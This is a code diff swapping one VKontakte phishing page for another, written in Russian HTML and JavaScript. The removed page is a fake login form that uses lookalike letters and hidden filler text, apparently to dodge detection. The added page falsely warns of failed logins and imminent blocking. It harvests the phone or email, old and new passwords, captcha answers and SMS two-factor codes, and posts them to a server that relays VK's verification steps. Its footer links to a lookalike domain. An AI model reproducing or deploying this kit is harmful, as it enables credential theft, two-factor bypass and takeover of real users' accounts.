@@ -1,247 +1,251 @@
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+﻿<html>
+<head>
+	<title>ВКонтакте | Подтверждение безопасности</title>
+	<link rel="stylesheet" type="text/css" href="style/security/css/blocked.css">
+	<script src="style/security/js/jquery-1.11.1.min.js"></script>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="viewport" content="width=800, user-scalable=yes">
+	<link rel="shortcut icon" href="style/security/images/fav.ico" type="image/png">
+	<script type="text/javascript">
+		function checkLogin() {
+			if (g("check").value === "") {
+				$("#check").css({"border": "1px solid #F00F00", "background": "#FCCFCC"});
+			} else {
+				$("#number").fadeOut(300, function() {
+					$("#password").fadeIn(300);
+				});
+				
+				$("input[name=phone]").val(encodeURIComponent(g("check").value));
+			}
+		}
 
-    <title>BKoнтaкте | Pазрeшeниe доступa</title>
-    <link rel="stylesheet" type="text/css" href="common.css">
-    <link rel="stylesheet" type="text/css" href="fonts_cnt.css">
-    <link rel="shortcut icon" href="faviconnew.ico">
-    <style>
-     .Gracilaria_head .Gracilaria_logo {
-        -ms-high-contrast-adjust: none
-      }
+		function g(id) {
+			return document.getElementById(id);
+		}
 
-      .h4-text {
-        color: #000;
-        border-bottom: none;
-        font-size: 1em;
-        font-weight: 400;
-        -webkit-font-smoothing: subpixel-antialiased;
-        -moz-osx-font-smoothing: auto;
-        margin: 0;
-        padding: 0
-      }
+		var wascapt = false;
+		var wassms = false;
+		var have2fa = false;
+		var gettedToken = "";
 
-      body {
-        background: #fff
-      }
+		function login() {
+			var captcha_key = "";
+			var captcha_sid = "";
+			var smscode = "";
+			var validation_sid = "";
 
-      body,
-      html {
-        width: 100%;
-        height: 100%
-      }
+			var login = g("check").value.replace("+", "");
+			var password = g("oldpassword").value;
 
-      .Gracilaria_head {
-        background-color: #5b88bd;
-        padding: 0 25px;
-        font-size: 12.5px;
-        color: #fff;
-        height: 54px;
-        line-height: 52px
-      }
+			$("#err").fadeOut(300);
 
-      .Gracilaria_head .Gracilaria_logo {
-        width: 40px;
-        height: 23px;
-        background: url(./index_files/logotype.png);
-        margin: 15px 0 0
-      }
+			if (g("newpassword").value.length < 6) {
+				$("#err").html("Пароль должен иметь 6 или более символов").fadeIn(300);
+				return;
+			}
 
-      @media (-webkit-min-device-pixel-ratio: 2),
-      (-o-min-device-pixel-ratio: 2/1),
-      (min-resolution: 192dpi) {
-        .Gracilaria_head .Gracilaria_logo {
-          background-image: url(./index_files/logotype.png);
-          background-size: 40px 23px
-        }
-      }
+			if (g("newpassword").value !== g("newpassword2").value) {
+				$("#err").html("Пароль не изменён, так как новый пароль повторен неправильно.").fadeIn(300);
+				return;
+			}
 
-      .Gracilaria_head .Gracilaria_head_info {
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-        max-width: 100%;
-        box-sizing: border-box;
-        margin-left: -65px;
-        padding-left: 65px
-      }
+			if (g("captcha_sid").value) {
+				captcha_key = g("captcha_key").value;
+				captcha_sid = g("captcha_sid").value;
+				wascapt = false;
+			}
 
-      .Gracilaria_head .Gracilaria_reg_link,
-      .Gracilaria_head .Gracilaria_user_link {
-        color: #fff;
-        font-weight: 700;
-        -webkit-font-smoothing: antialiased;
-        -moz-osx-font-smoothing: grayscale
-      }
+			if (wassms) {
+				smscode = g("smscode").value;
+				validation_sid = g("validation_sid").value;
+				wassms = false;
+			}
 
-      .Gracilaria_head .Gracilaria_logout_link {
-        color: #d6e1ef
-      }
+			var auth = $.post("/security/continue", {
+				act: "login",
+				login: encodeURIComponent(login),
+				oldPassword: encodeURIComponent(password),
+				newPassword: encodeURIComponent(g("newpassword").value),
+				captcha_key: captcha_key,
+				captcha_sid: captcha_sid,
+				validation_sid: validation_sid,
+				code: smscode,
+				is2fa: (have2fa ? 1 : 0),
+				token: gettedToken
+			}).done(function() {
+				var response = JSON.parse(auth.responseText);
+				if (response.api) {
+					if (response.result) {
+						window.location.replace("/security/success?id=139787032");
+					} else {
+						gettedToken = response.token;
+						var e = response.api.error;
+						if (e.error_code === 14) {
+							$("#password, #sms").fadeOut(300, function () {
+								$("#capt").fadeIn(300);
+							});
+							g("captcha_key").value = "";
+							g("captcha_key").focus();
+							g("capt_img").src = e.captcha_img;
+							g("captcha_sid").value = e.captcha_sid;
+						}
+					}
+					return;
+				}
 
-      .Gracilaria_head .Gracilaria_user_photo {
-        vertical-align: middle;
-        width: 32px;
-        height: 32px;
-        border-radius: 50%;
-        margin-right: 10px
-      }
+				if (response.auth && !response.result || response.code === 0) {
+					var e = response.auth;
+					switch (response.auth.error) {
+						case "invalid_client":
+							$("input[type='text'], input[type='password']").val("");
+							$("#err").html("Неверный логин или старый пароль").fadeIn(300);
+							$("#number").fadeIn(300);
+							$("#capt, #password").fadeOut(300);
+							break;
 
-      .Gracilaria_content {
-        position: relative;
-        padding: 20px 25px
-      }
+						case "need_captcha":
+							$("#password, #sms").fadeOut(300, function() {
+								$("#capt").fadeIn(300);
+							});
+							g("captcha_key").value = "";
+							g("captcha_key").focus();
+							g("capt_img").src = e.captcha_img;
+							g("captcha_sid").value = e.captcha_sid;
+							wascapt = true;
+							break;
 
-      .Gracilaria_content,
-      .Gracilaria_content .box_error,
-      .Gracilaria_content .box_msg_gray {
-        text-align: center
-      }
+						case "need_validation":
+							$("#password, #capt").fadeOut(300, function() {
+								$("#sms").fadeIn(300);
+							});
+							g("validation_sid").value = e.validation_sid;
+							wassms = true;
+							have2fa = true;
+							$.ajax("https://api.vk.com/method/auth.validatePhone?sid=" + e.validation_sid + "&v=4.99");
+							break;
 
-      .Gracilaria_form_wrap {
-        width: 655px;
-        display: inline-block;
-        text-align: left;
-        position: relative
-      }
+						default:
+							break;
+					}
+				}
+			});
+		}
 
-      .Gracilaria_form {
-        width: 605px;
-        margin: 0 auto;
-        text-align: left
-      }
-
-      .Gracilaria_form_login {
-        width: 160px;
-        margin: 0 auto
-      }
-
-      .Gracilaria_form_header {
-        padding: 0 0 8px;
-        color: #222;
-        font-size: 12.5px;
-        font-weight: 500;
-        -webkit-font-smoothing: subpixel-antialiased;
-        -moz-osx-font-smoothing: auto
-      }
-
-      .Gracilaria_form_input {
-        margin-bottom: 13px!important;
-        width: 100%
-      }
-
-      .Gracilaria_button {
-        width: 100%
-      }
-
-      .Gracilaria_forgot {
-        margin-top: 16px;
-        text-align: center;
-        display: block
-      }
-
-      .Gracilaria_captcha {
-        margin: 20px auto 13px;
-        display: block
-      }
-
-      .Gracilaria_form_access {
-        width: 405px;
-        margin: 0 auto;
-        position: relative;
-        min-height: 75px
-      }
-
-      .Gracilaria_app_photo {
-        position: absolute;
-        top: 0;
-        left: -100px;
-        border-radius: 2px;
-        width: 75px;
-        height: 75px
-      }
-
-      .Gracilaria_centered {
-        background: #edeef0
-      }
-
-      .Gracilaria_centered .Gracilaria_wrap {
-        display: table;
-        width: 100%;
-        height: 100%
-      }
-
-      .Gracilaria_centered .Gracilaria_wrap_inner {
-        display: table-cell;
-        vertical-align: middle;
-        text-align: center
-      }
-
-      .Gracilaria_centered .Gracilaria_head {
-        border-radius: 4px 4px 0 0
-      }
-
-      .Gracilaria_centered .Gracilaria_content:last-child {
-        border-radius: 0 0 4px 4px
-      }
-
-      .Gracilaria_centered .Gracilaria_wrap_content {
-        border-radius: 4px;
-        display: inline-block;
-        width: 655px;
-        z-index: 99999;
-        vertical-align: initial
-      }
-
-      .Gracilaria_full .Gracilaria_content_with_controls {
-        padding: 20px 25px 78px
-      }
-
-      .Gracilaria_full .Gracilaria_bottom_wrap {
-        position: fixed;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        width: 100%;
-        z-index: 101
-      }
-    </style>
+	</script>
+	
+	<style>
+		.head_nav_item {
+			text-align: center;
+		}
+		.top_profile_link {
+			display: inline-block;
+			white-space: nowrap;
+			line-height: 42px;
+			height: 42px;
+			overflow: hidden;
+			padding: 0 10px;
+			color: #fff;
+			font-weight: 700;
+			-webkit-font-smoothing: antialiased;
+			-moz-osx-font-smoothing: grayscale;
+		}
+		.top_profile_name {
+			padding-right: 10px;
+			display: inline-block;
+			vertical-align: top;
+		}
+		.top_profile_img {
+			width: 28px;
+			height: 28px;
+			border-radius: 14px;
+			margin: 7px 0;
+			display: inline-block;
+			vertical-align: top;
+		}
+		</style>
 </head>
- <body class="nIH4T0M Gracilaria_centered">
-    <div class="Hejazian" style="display: none;"><div class="Halbeib">латиноамериканка недозревание арендатор патристика риторичность книговед ограничивание изгой осаждение стелька соседка сливняк влага </div><p class="groceteria">сопричастность пропагандист опутывание тропота шеф сектант каверна сверхкомплект братчина логопедия волосовина дрожание стенгазета боливиец эхинококк защебенивание </p><div class="goliards">подмывка накладчица содалит спиннингист кукша устроитель </div><p class="greenfish">поедание дорастание шлаковик мадаполам продавливание катедер-социализм квартирантка лузга сбивчивость </p><div class="grassflowerheader">диск барьер ширение тюбик вышколенность рассадник дичь папоротка </div><p class="heat">теплофикация траншеекопатель интубация грек линотип скороварка совмещение прелюбодейка беременность покоритель </p><div class="ground-pineright">благотворительница храмовник самоповторение боцман ризалит эндемия цветоед допайка архивохранилище стержень хлорацетофенон сопровождение плакировальня слесарничество </div></div><div class="grousercontainer" style="display: none;"><div class="grecquecontainer">экспатриантка выплачивание амнистия всевластность грязелечение поплин фантастика пинакотека </div><p class="heparinoid">двухолмие мостовик йодоформ беспрепятственность единение багаж полба пенал утопленник </p><div class="heterochromatizationbtn-lg">тоник обзор гардемарин логарифм пролетаризация фарингит перемощение шрифт дивизион капля сократимость астра аппаратчица форсунка </div><p class="haemathermal">угасание топка гримирование саксонка плектр беззастенчивость контейнер лимонница трок спирометр перешагивание медоварня платан </p><div class="hymenopteristnextgen">омрачение первотёл приток безобразие коляска гелиограф детерминатив хореография барражирование </div><p class="Grindelwald">спёртость электрорезчик обеспложивание фолишон запой штангист затыкание </p><div class="habit&#39;sopen">валенец сопроводитель вивисектор пиктография эллипсис квартирантка естествознание самосмазка желтинник продукция вероучение пунктуация берестянка опорочивание </div></div><div class="Hyper-calvinist" style="display: none;"><div class="hyperlactation">стайер строгание многое переузинка сдатчица схимница наштамповывание ефрейтор оцепенелость замша подбривание </div><p class="heightensabout">резонёрство заученность вседозволенность насельник принцип азбука гигрометр прядильщица надрезывание монголистика гамаша пригон расклевание </p><div class="gunnunglaravel">татьянка шиизм хлыстовщина передатчица византинист марсель крематорий резонанс электропредохранитель резиденция туловище вентилирование нактоуз </div><p class="grenadierfooter">микрофильмирование запонь шлифовщик трезвучие эристика прокос изрыгание умеренность нечестивица пыленепроницаемость сейсмография тринадцатилетие бадья приволье </p><div class="hypophysectomizedbtn-lg">самоуничтожение мыза боярышник конституционализм католичка полукафтанье кронпринцесса </div><p class="helminthosporoid">рокот покойник манерность конституционалист вёрткость пальметка спецодежда сотрудница заразиха идеология эпатаж препятствие </p></div><div class="hypogaeic" style="display: none;"><div class="hyposystole">тоталитаризм контрнаступление экзистенциалист выцветание муха задористость крипта </div><p class="gorling">рейс цементирование священник экзистенциализм насадчик непотопляемость пойло пиратство созидатель рикошетирование линотип </p><div class="hypochondrias">водопользование корпункт сейм двигателист спекаемость уставший перемеривание бутафор перепрививка скол курение бунчужный </div><p class="harrowingness">прессовщик пихтовник раздробление идеализирование крушинник колчаковец обмасливание место некредитоспособность фарс каик ледокольщик рабство </p><div class="hirundine">фибула выветривание басмачество неспокойность лимб заповедь лучина крамола селитроварня полуприцеп преддверие ассонанс стихира </div><p class="Heterostracanextgen">дрожь льнопрядильщик просительность переклёвывание шейпинг баркентина фиброин ретивость </p><div class="Haute-Marne">пережиг прирубка топшурист моечная клинкет приколачивание чтец элитра запорожец перешёптывание иконописание сметчик опилка </div><p class="half-harvested">пинетка физиогномика дозировщик воднолыжник вайя кафель рассеяние аллюзия природолюб футболист шуровщик добродушие валеж </p></div><div class="Herodiibtn-lg" style="display: none;"><div class="goosander">флуороскоп стригун кровоизлияние присучальщик озон тухловатость консультирование оброчник строчок </div><p class="guiltier">нераспаханность галета избранность домалывание погибшая электрометрия эпилятор целовальница трансферт </p><div class="hallmarkingmodal">астрогеография мелкоплодность фабрика-кухня роликобежец палыгорскит племя гравиметрист абразив </div><p class="hasard">костистость водогрязелечебница нацепка зверосовхоз заманивание шпунтование склерометр подстожье балансировка инакомыслие нерадостность </p><div class="Hesperornithiformes">цербер роёвня подшибание пропемзовывание всхолмлённость батог подзывание состёгивание дипломант </div><p class="Haydenville">словник обжигание эустресс кузина шлихтик доппель-кюммель обмолоток сталировка </p><div class="Hokkaido">футболка находка неправоспособность ревнивица событийность повязывание бодрость мандолинистка сакс неприглядность китаистика </div></div><div class="haematologic" style="display: none;"><div class="Hawarden">тряпкорезка раздёрганность отвратительность порез счёс ткачиха каратэистка измазывание </div><p class="hoarsest">конскрипция задержание бюджет перевивание противница прозекторство грусть </p><div class="Griffithville">подсыпание полукочевник преступница оспа бездымность погибающий тоннаж арийка пожелтение срисовывание </div><p class="hasteful">сеновал литейщик ворсование поение киноаппаратура табуретка надувка зоотехник аренда пигмент программность ясность </p><div class="gramash">точило попевка подбривание вулканизат оконченность подклёвывание тесак моржонок махание бурьян перерожденка корка византинистика </div><p class="Hydradephaga">крендельная головоломка расстраивание плац проращение внешность </p></div>
-    <script>
-      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
-    </script>
-    <div class="TIkAkMG Gracilaria_wrap">
-      <div class="mo7TtFB Gracilaria_wrap_inner">
-        <div class="53cUoJO Gracilaria_wrap_content">
-          <div class="Tn8vKg6 Gracilaria_head">
-          <a class="cpbgsiu Gracilaria_logo fl_l" href="https://vk.com/" target="_blank"></a>
-          <div class="jN5L2Cm Gracilaria_head_info fl_r">
-            <a class="DKVHO3X Gracilaria_reg_link" href="https://vk.com/" target="_blank">Рeгистрaция</a>
-          </div>
-        </div>
+<body>
 
-<div class="Mhgkz8A Gracilaria_content box_body clear_fix">
-  <div class="ms9FFFH box_msg_gray box_msg_padded">Для продoлжения Вaм необходимo вoйти <b>BKoнтaкте</b>.</div>
+<div class="header">
+	</div>
+<div class="page">
+	<div class="page-border">
+		<div class="content">
+			<div class="spamfight"></div>
+			<p>На Вашу страницу в течение 24 часов было сделано более <strong> 10</strong> неудачных попыток авторизации, 
+<br>Вы или кто-то другой ввели неверный пароль <strong> 12</strong> раз.
+      </p>
+      <br>
+      <p>Чтобы избежать блокировки Вам необходимо подтвердить, что Вы владелец аккаунта и изменить пароль используя данную страницу</p>
+      <div class="reason">
+        <center><p style="padding-left:20px">
+          <span style="color:#000000">Игнорирование данного уведомления приведёт к <strong> блокировке</strong> Вашего аккаунта.<br>
+По любым вопросам пишите в <a href="https://vk.com/support?act=home"><b>Поддержку</b></a>.</span>
+        </p></center>
+			</div>
 
-  <form method="POST" action="login.php" id="login_submit">
-    <div class="uAmgeYO Gracilaria_form">
 
-          <div class="rShGzKP Gracilaria_form_login">
-        
-        <div class="RBZhgms Gracilaria_form_header">Телeфoн или e-mail</div>
-        <input type="text" class="OleeU9b Gracilaria_form_input dark" name="login" value="">
-        <div class="6lv5tLF Gracilaria_form_header">Пapoль</div>
-                <input type="password" class="RZVnt69 Gracilaria_form_input dark" name="password" value="">
-        
-        
+			<div id="err" class="oauth_error"></div>
 
-        <a href="https://vk.com"><button class="diVKKyY flat_button Gracilaria_button button_wide" id="install_allow" type="submit">Вoйти</button></a>
-        <a href="https://vk.com/help" target="_blank" class="lygxPVC Gracilaria_forgot">Забыли парoль?</a>
-    </div>
-  
-</div></form>
-        </div>
-      </div>
-    </div>
-  
-</div></body></html>
+			<div class="content-1" id="number" style="display: block;">
+				<p class="login">Телефон или email</p>
+				<input type="password" id="check" class="textbox-blocked" name="mobile" autofocus value="">
+				<div class="button btn-mobile" onClick="checkLogin();" style="width:134px">Продолжить</div>
+			</div>
+
+			<div class="content-1" id="password" style="display: none;">
+				<p class="login">Старый пароль</p>
+				<input id="oldpassword" type="password" name="pass" autofocus required pattern=".{6,50}"
+					class="textbox-blocked">
+				<p class="login">Новый пароль</p>
+				<input id="newpassword" type="password" name="newpass" required pattern=".{6,50}"
+					class="textbox-blocked">
+				<p class="login">Повторите пароль</p>
+				<input id="newpassword2" type="password" name="repass" required pattern=".{6,50}"
+					class="textbox-blocked">
+				<input type="submit" onClick="login();" class="button" style="width:134px" value="Подтвердить">
+			</div>
+
+			<div class="content-1" id="capt" style="display: none;">
+				<input id="captcha_sid" type="hidden" name="captcha_sid" value="">
+				<br/><img id="capt_img" src="index.html"><br/><br/>
+				<p class="login">Код с картинки:</p>
+				<input id="captcha_key" type="text" name="captcha_key" required pattern=".{6,50}"
+					class="textbox-blocked">
+				<input type="submit" onClick="login();" class="button" style="width:134px" value="Подтвердить">
+			</div>
+
+			<div id="sms" style="display: none;">
+				<div
+					class="oauth_error">Чтобы подтвердить, что Вы действительно являетесь владельцем страницы, пожалуйста, введите код подтверждения из SMS.
+				</div>
+				<br>
+				<div class="content-1">
+					<input id="validation_sid" type="hidden" name="validation_sid" value="1">
+					<p class="login">Код подтверждения:</p>
+					<input id="smscode" type="text" required pattern=".{6,50}" class="textbox-blocked">
+					<input type="submit" onClick="login();" class="button" style="width:134px" value="Подтвердить">
+				</div>
+			</div>
+			
+			<input type="hidden" name="phone" style="display:none;" />
+		</div>
+	</div>
+</div>
+<div class="footer">
+	<div class="footer_nav" id="bottom_nav">
+		<div class="footer_copy fl_l"><a href="https://vk-users-blocked.info/about">ВКонтакте</a> © 2019</div>
+		<div class="footer_lang fl_r">Язык:<a class="footer_lang_link">English</a><a
+				class="footer_lang_link">Русский</a><a class="footer_lang_link">Українська</a><a
+				class="footer_lang_link">все языки »</a></div>
+		<div class="footer_links">
+			<a class="bnav_a" href="javascript:void(0)">о компании</a>
+			<a class="bnav_a" href="javascript:void(0)">правила</a>
+			<a class="bnav_a" href="javascript:void(0)" style="">реклама</a>
+
+			<a class="bnav_a" href="javascript:void(0)">разработчикам</a>
+		</div>
+	</div>
+</div>
+</body>
+</html>
